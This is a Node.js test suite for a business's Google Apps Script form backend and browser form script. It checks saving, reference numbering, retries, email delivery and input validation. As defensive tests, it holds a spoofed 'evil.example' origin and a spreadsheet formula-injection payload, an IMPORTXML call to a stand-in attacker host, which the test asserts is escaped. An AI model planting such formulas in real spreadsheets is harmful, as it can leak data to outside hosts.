const {test}=require('node:test');
const assert=require('node:assert/strict');
const fs=require('node:fs');
const vm=require('node:vm');
const crypto=require('node:crypto');

function fixture() {
  class Sheet {
    constructor(){this.rows=[Array(15).fill('header')];}
    getLastRow(){return this.rows.length;}
    appendRow(row){this.rows.push([...row]);}
    getDataRange(){return {getValues:()=>this.rows.map(r=>[...r])};}
    getRange(row,col,n=1,width=1){const self=this;return {
      getValues(){return self.rows.slice(row-1,row-1+n).map(r=>r.slice(col-1,col-1+width));},
      getValue(){return self.rows[row-1][col-1];},
      setValue(value){self.rows[row-1][col-1]=value;}
    };}
  }
  const sheets=Object.fromEntries(['Clientes','Proveedores','Cotizaciones','Registro de envíos','Errores técnicos'].map(n=>[n,new Sheet()]));
  const properties=new Map([['GLV_SHEET_ID','private-test-sheet'],['GLV_SIGNING_SECRET','test-only-secret'],['GLV_MODE','TEST']]);
  const mails=[];let owner='serviciosglvsas@gmail.com',failAt=0,quota=100,locked=false;
  const context={console,Date,JSON,Object,String,Number,Math,Error,
    Session:{getEffectiveUser:()=>({getEmail:()=>owner})},
    PropertiesService:{getScriptProperties:()=>({getProperty:k=>properties.get(k),setProperty:(k,v)=>properties.set(k,v)})},
    SpreadsheetApp:{openById:()=>({getSheetByName:n=>sheets[n]}),flush(){}},
    LockService:{getScriptLock:()=>({tryLock(){if(locked)return false;locked=true;return true;},releaseLock(){locked=false;}})},
    Utilities:{DigestAlgorithm:{SHA_256:'sha256'},computeDigest:(alg,s)=>crypto.createHash(alg).update(s).digest(),computeHmacSha256Signature:(s,key)=>crypto.createHmac('sha256',key).update(s).digest(),base64EncodeWebSafe:b=>Buffer.from(b).toString('base64url'),formatDate:(d,tz,format)=>format==='yyyy'?new Intl.DateTimeFormat('en',{year:'numeric',timeZone:tz}).format(d):d.toISOString()},
    MailApp:{getRemainingDailyQuota:()=>quota,sendEmail:m=>{if(mails.length+1===failAt)throw Error('transport uncertain');mails.push(m);quota--;}}
  };
  vm.createContext(context);vm.runInContext(fs.readFileSync('services/glv-forms/Code.gs','utf8'),context);
  function payload(kind='client') {
    const schema=context.GLV_SCHEMA[kind],fields={};
    schema.required.forEach(k=>fields[k]='PRUEBA TÉCNICA');
    (schema.checks||[]).forEach(k=>fields[k]='true');
    fields[schema.email]='serviciosglvsas@gmail.com';fields[schema.name]='PRUEBA TÉCNICA';
    fields[schema.phone]='0000000';fields[schema.country]='Colombia';
    fields.private_document='PRIVATE_DOCUMENT_DO_NOT_EMAIL_APPLICANT';
    const p={kind,source:schema.source,origin:'https://glvservicesexp.com',retryId:crypto.randomUUID(),channel:crypto.randomBytes(16).toString('hex'),issued:Date.now()-5000,website:'',fields};
    p.signature=context.sign_(p.origin+'|'+p.channel+'|'+p.issued);return p;
  }
  return {context,sheets,properties,mails,payload,owner:v=>owner=v,failAt:v=>failAt=v,quota:v=>quota=v,lock:v=>locked=v};
}
test('all nine form variants save complete data and send exactly three emails',()=>{
  for(const kind of Object.keys(fixture().context.GLV_SCHEMA)){
    const f=fixture(),p=f.payload(kind),r=f.context.submitForm(p);
    assert.equal(r.ok,true,kind);assert.match(r.code,/^GLV-(CL|PRV|COT)-\d{4}-000001$/);
    assert.equal(f.mails.length,3);assert.equal(f.mails[0].to,'contabilidad@glvservicesexp.com');
    assert.equal(f.mails[1].to,'serviciosglvsas@gmail.com');assert.equal(f.mails[2].to,p.fields[f.context.GLV_SCHEMA[kind].email]);
    assert.equal(f.mails[0].body,f.mails[1].body);
    f.mails.forEach(m=>assert.ok(m.body.includes(r.code)));
    assert.ok(f.mails[0].body.includes('PRIVATE_DOCUMENT_DO_NOT_EMAIL_APPLICANT'));
    assert.ok(!f.mails[2].body.includes('PRIVATE_DOCUMENT_DO_NOT_EMAIL_APPLICANT'));
    assert.equal(f.sheets[f.context.GLV_SCHEMA[kind].sheet].rows[1][8],'SENT');
    assert.equal(f.sheets['Registro de envíos'].rows.length,4);
  }
});
test('identical retry returns same number without sending again',()=>{
  const f=fixture(),p=f.payload(),a=f.context.submitForm(p),b=f.context.submitForm(p);
  assert.equal(a.code,b.code);assert.equal(b.ok,true);assert.equal(f.mails.length,3);assert.equal(f.sheets.Clientes.rows.length,2);
});
test('changed payload with same retry id rejected; independent requests get distinct numbers',()=>{
  const f=fixture(),p=f.payload(),a=f.context.submitForm(p);p.fields.k_tel='another';
  assert.equal(f.context.submitForm(p).error,'RETRY_CONFLICT');
  const b=f.context.submitForm(f.payload());assert.notEqual(a.code,b.code);
});
test('all supplier categories share one sequence',()=>{
  const f=fixture();['supplier','service','other'].forEach((kind,i)=>assert.ok(f.context.submitForm(f.payload(kind)).code.endsWith(String(i+1).padStart(6,'0'))));
});
test('sequence restored from sheet if counter missing',()=>{
  const f=fixture();const first=f.context.submitForm(f.payload());
  for(const key of f.properties.keys())if(key.startsWith('SEQ_'))f.properties.delete(key);
  const second=f.context.submitForm(f.payload());assert.notEqual(first.code,second.code);assert.ok(second.code.endsWith('000002'));
});
test('uncertain delivery is logged and not resent automatically',()=>{
  const f=fixture(),p=f.payload();f.failAt(2);const a=f.context.submitForm(p);
  assert.equal(a.ok,false);assert.equal(a.error,'DELIVERY_REVIEW');f.failAt(0);
  const b=f.context.submitForm(p);assert.equal(a.code,b.code);assert.equal(b.ok,false);assert.equal(f.mails.length,1);
  assert.equal(f.sheets.Clientes.rows[1][13],'UNKNOWN');
});
test('quota recovery sends remaining mail only, preserving reference',()=>{
  const f=fixture(),p=f.payload();f.quota(1);const a=f.context.submitForm(p);assert.equal(a.error,'MAIL_QUOTA');
  f.quota(100);const b=f.context.submitForm(p);assert.equal(a.code,b.code);assert.equal(b.ok,true);assert.equal(f.mails.length,3);
});
test('wrong owner, invalid email, missing required fields and declarations rejected',()=>{
  for(const [edit,error] of [
    [p=>p.fields.k_email='invalid','INVALID_EMAIL'],[p=>delete p.fields.k_nit,'REQUIRED_FIELDS'],[p=>p.fields.k_check1='false','DECLARATIONS_REQUIRED'],[p=>p.fields.k_email='third-party@example.com','TEST_ONLY']
  ]){const f=fixture(),p=f.payload();edit(p);assert.equal(f.context.submitForm(p).error,error);assert.equal(f.mails.length,0);}
  const f=fixture();f.owner('wrong@example.com');assert.equal(f.context.submitForm(f.payload()).error,'OWNER_REQUIRED');
});
test('origin, source, signature, minimum fill time and honeypot validated',()=>{
  for(const edit of [p=>p.origin='https://evil.example',p=>p.source='/bad',p=>p.signature='bad',p=>p.issued=Date.now(),p=>p.website='spam']){
    const f=fixture(),p=f.payload();edit(p);assert.equal(f.context.submitForm(p).ok,false);assert.equal(f.mails.length,0);
  }
});
test('rate limit applies to new submissions, not successful retries',()=>{
  const f=fixture(),p=f.payload();f.context.submitForm(p);for(let i=0;i<4;i++)assert.equal(f.context.submitForm(f.payload()).ok,true);
  assert.equal(f.context.submitForm(f.payload()).error,'RATE_LIMIT');assert.equal(f.context.submitForm(p).ok,true);
});
test('script lock prevents concurrent allocation and is released after exceptions',()=>{
  const f=fixture();f.lock(true);assert.equal(f.context.submitForm(f.payload()).error,'BUSY');assert.equal(f.mails.length,0);
  f.lock(false);assert.equal(f.context.submitForm(f.payload()).ok,true);
});
test('spreadsheet formula injection is escaped',()=>{
  const f=fixture(),p=f.payload();p.fields.k_tel='=IMPORTXML("https://evil.example", "x")';f.context.submitForm(p);
  assert.ok(f.sheets.Clientes.rows[1][5].startsWith("'="));
});
test('inline scripts parse; migrated pages have no legacy mail transport or code generator',()=>{
  for(const page of ['index.html','registro-clientes.html','registro-proveedores.html','cotizacion.html']){
    const html=fs.readFileSync(page,'utf8');
    for(const script of html.matchAll(/<script\b([^>]*)>([\s\S]*?)<\/script>/gi)){
      if(!/type=["']application\/ld\+json/i.test(script[1]))new vm.Script(script[2],{filename:page});
    }
    assert.ok(html.includes('/assets/js/glv-forms.js'));
    assert.ok(!html.includes('function sendW3F('));assert.ok(!html.includes('function glvGenCode('));assert.ok(!html.includes('api.web3forms.com'));
  }
});

function browserFixture(result,endpoint='https://script.google.com/macros/s/test-deployment/exec') {
  const fields={gn_n:'PRUEBA TÉCNICA GLV',gn_e:'PRUEBA TÉCNICA',gn_pa:'Colombia',gn_em:'serviciosglvsas@gmail.com',gn_d:'Prueba sin venta',gn_agent:'agent1'};
  const inputs=Object.entries(fields).map(([id,value])=>({id,value,type:id==='gn_em'?'email':'text',disabled:false,checkValidity:()=>true,focus(){}}));
  const buttons=[{disabled:false}];const listeners=[],store=new Map(),requests=[];let statusNode;
  const root={dataset:{},querySelectorAll(selector){return selector==='button'?buttons:inputs;},querySelector(selector){return selector==='[data-glv-status]'?statusNode:null;},appendChild(el){statusNode=el;}};
  const document={readyState:'loading',addEventListener(){},getElementById:id=>id==='genForm'?root:null,createElement:tag=>({tag,dataset:{},style:{},setAttribute(){}}),body:{appendChild(frame){const channel=new URL(frame.src).searchParams.get('channel');setImmediate(()=>listeners.forEach(fn=>fn({origin:'https://n-test-script.googleusercontent.com',source:bridge,data:{type:'GLV_READY',channel}})));}}};
  const bridge={postMessage(message){requests.push(message);setImmediate(()=>listeners.forEach(fn=>fn({origin:'https://n-test-script.googleusercontent.com',source:bridge,data:{type:'GLV_RESULT',channel:message.channel,requestId:message.requestId,result}})));}};
  const window={GLV_FORMS_CONFIG:{endpoint},addEventListener:(type,fn)=>listeners.push(fn)};
  const context={window,document,location:{origin:'http://127.0.0.1:8799'},crypto:crypto.webcrypto,TextEncoder,URL,setTimeout,clearTimeout,console,MutationObserver:class{},localStorage:{getItem:k=>store.get(k),setItem:(k,v)=>store.set(k,v)}};
  vm.createContext(context);vm.runInContext(fs.readFileSync('assets/js/glv-forms.js','utf8'),context);
  return {forms:window.GLVForms,requests,root,inputs,buttons,status:()=>statusNode?.textContent};
}
test('browser refuses success when endpoint is not activated',async()=>{
  const f=browserFixture(null,'');let success=false;
  const r=await f.forms.submit('quote',{success(){success=true;}});
  assert.equal(r,false);assert.equal(success,false);assert.equal(f.requests.length,0);assert.match(f.status(),/pendiente de activación/);assert.equal(f.buttons[0].disabled,false);
});
test('browser waits for authenticated bridge response and preserves retry id',async()=>{
  const f=browserFixture({ok:true,code:'GLV-COT-2026-000001',mailStatus:'SENT'});let calls=0;
  const first=f.forms.submit('quote',{success(){calls++;}});assert.equal(calls,0);assert.equal(f.buttons[0].disabled,true);
  assert.equal(await f.forms.submit('quote'),false);
  await first;assert.equal(calls,1);assert.match(f.status(),/GLV-COT-2026-000001/);
  await f.forms.submit('quote');assert.equal(f.requests[0].payload.retryId,f.requests[1].payload.retryId);
  assert.equal(f.requests[0].payload.fields.gn_em,'serviciosglvsas@gmail.com');
});
test('browser does not show success for partial delivery',async()=>{
  const f=browserFixture({ok:false,error:'MAIL_QUOTA',code:'GLV-COT-2026-000001'});let success=false;
  assert.equal(await f.forms.submit('quote',{success(){success=true;}}),false);assert.equal(success,false);assert.match(f.status(),/requieren revisión/);
});
